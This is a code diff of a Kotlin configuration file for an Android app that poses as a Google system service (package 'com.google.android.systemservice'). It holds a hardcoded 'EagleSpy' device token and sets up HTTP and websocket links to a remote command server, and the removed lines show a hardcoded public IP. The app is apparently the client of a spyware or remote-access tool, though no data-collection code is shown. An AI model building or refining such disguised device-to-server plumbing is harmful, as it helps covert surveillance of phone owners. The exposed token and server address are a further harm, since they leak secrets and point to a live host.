@@ -1,17 +1,19 @@
 package com.google.android.systemservice.config
 
 import android.content.Context
+import com.google.android.systemservice.BuildConfig
 
 object AndroidConfig {
     // Server Configuration
-    // TODO: Change this to your computer's LAN IP (e.g., 192.168.1.5) if testing on physical device OR MuMu Player
     // 10.0.2.2 works ONLY for the official Android Studio Emulator
-    // private var serverBaseUrl = "192.168.1.5:8080" 
-    private var serverBaseUrl = "213.91.211.150:8080"
+    // Configured via Gradle property: -PserverBaseUrl="IP:PORT"
+    private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
     private var useHttps = false
     
     // API Authentication Token (MUST match server's config/device_secret.token)
+    // Alias for compatibility: use 'deviceToken' or 'DEVICE_TOKEN'
     const val DEVICE_TOKEN = "EagleSpy_X9f2K7mN4pQ8wL3jR6vT1bY5cH0sA"
+    val deviceToken: String get() = DEVICE_TOKEN
     
     // Device Identifier (cached from Settings.Secure.ANDROID_ID)
     var deviceId: String = ""
@@ -37,10 +39,17 @@ object AndroidConfig {
         get() = if (useHttps) "wss" else "ws"
     
     val serverUrl: String
-        get() = "$httpProtocol://$serverBaseUrl"
+        get() = if (serverBaseUrl.startsWith("http")) serverBaseUrl else "$httpProtocol://$serverBaseUrl"
     
     val websocketUrl: String
-        get() = "$wsProtocol://$serverBaseUrl/cable"
+        get() {
+            val base = if (serverBaseUrl.startsWith("http")) {
+                serverBaseUrl.replaceFirst("https", "wss").replaceFirst("http", "ws")
+            } else {
+                "$wsProtocol://$serverBaseUrl"
+            }
+            return "$base/cable"
+        }
     
     val apiBaseUrl: String
         get() = "$serverUrl/api"
